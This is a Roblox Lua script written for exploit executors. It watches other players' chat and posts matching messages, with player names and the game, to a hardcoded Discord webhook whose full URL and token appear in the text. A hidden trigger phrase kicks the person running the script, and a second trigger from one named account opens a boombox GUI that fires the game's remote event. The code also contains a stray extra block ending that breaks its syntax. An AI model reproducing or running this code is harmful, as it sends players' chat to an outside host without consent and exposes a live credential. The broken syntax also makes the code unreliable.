local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1398217578421288960/cY6i2E5MSNvEC43F0POP6_Y7p-1rTi-GxZxzHyYnmgFfLRz-oq_8nOwm8kqGS81U-mcv"

local requestFunc = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
if not requestFunc then
	warn("No supported HTTP request function found.")
	return
end


-- Function to create and handle the music player GUI
local function musicPlayer()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local MainRemoteEvent = ReplicatedStorage:WaitForChild("MainRemotes"):WaitForChild("MainRemoteEvent")
	local Player = game.Players.LocalPlayer
	local ChatService = game:GetService("Chat")
	local UserInputService = game:GetService("UserInputService")
    -- Create GUI elements
    local gui = Instance.new("ScreenGui")
    gui.Name = "SongGUI"
    gui.Parent = Player.PlayerGui
    gui.Enabled = true  -- Show the GUI immediately when musicPlayer() is called

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)  -- Dark Gray for background
    frame.Parent = gui

    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -35, 0, 5)
    closeButton.Text = "X"
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- Red for Close button
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.Parent = frame

    local textbox = Instance.new("TextBox")
    textbox.Size = UDim2.new(0, 250, 0, 30)
    textbox.Position = UDim2.new(0.5, -125, 0.3, 0)
    textbox.Text = ""
    textbox.PlaceholderText = "Enter SONG ID"
    textbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)  -- Darker Gray for TextBox
    textbox.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
    textbox.Parent = frame

    local startStopButton = Instance.new("TextButton")
    startStopButton.Size = UDim2.new(0, 250, 0, 50)
    startStopButton.Position = UDim2.new(0.5, -125, 0.6, 0)
    startStopButton.Text = "Start"
    startStopButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green for Start button
    startStopButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
    startStopButton.Parent = frame

    local isPlaying = false
    local currentId = nil

    -- Function to toggle the visibility of the GUI
    local function toggleGUI()
        gui.Enabled = not gui.Enabled
    end

    -- Function to close the GUI
    local function closeGUI()
        gui.Enabled = false
    end

    -- Function to handle Start/Stop button click
    local function onStartStopClicked()
        local id = tonumber(textbox.Text)
        
        if id then
            if isPlaying then
                -- Stop the boombox
                local args = {
                    "BoomboxStop",
                }
                MainRemoteEvent:FireServer(unpack(args))
                startStopButton.Text = "Start"
                startStopButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green for Start
                isPlaying = false
            else
                -- Start the boombox
                local args = {
                    "Boombox",
                    id
                }
                MainRemoteEvent:FireServer(unpack(args))
                startStopButton.Text = "Stop"
                startStopButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- Red for Stop
                isPlaying = true
                currentId = id
            end
        end
    end

    -- Connect the functions to buttons
    closeButton.MouseButton1Click:Connect(closeGUI)
    startStopButton.MouseButton1Click:Connect(onStartStopClicked)
end


-- Get Game Name
local function getGameName()
	local success, result = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	return (success and result.Name) or "Unknown Game"
end

-- Send embed to webhook
local function sendWebhook(playerName, message)
	local payload = {
		["embeds"] = {{
			["title"] = "Keyword Detected",
			["description"] = string.format("**Player:** %s\n**Message:** %s\n**Game:** [%s](https://www.roblox.com/games/%d)\n**Time:** <t:%d:F>",
				playerName,
				message,
				getGameName(),
				game.PlaceId,
				os.time()
			),
			["color"] = 0xFF0000,
			["footer"] = {["text"] = "waadb detector"},
			["timestamp"] = DateTime.now():ToIsoDate()
		}}
	}

	local json = HttpService:JSONEncode(payload)

	requestFunc({
		Url = WEBHOOK_URL,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = json
	})
end

-- Monitor a player's chat
local function monitor(player)
	player.Chatted:Connect(function(msg)
		if msg:lower():match("cooltestcode!") then
			sendWebhook(player.Name, msg)
			LocalPlayer:Kick("276")
		end

		if player.Name == "OvercomeHatred" and msg:lower() == "!play" then
            musicPlayer()  -- Call the musicPlayer function
        end
    end)
end
	end)
end

-- Attach to current players
for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer then
		monitor(player)
	end
end

-- Attach to new players
Players.PlayerAdded:Connect(function(player)
	if player ~= LocalPlayer then
		monitor(player)
	end
end)
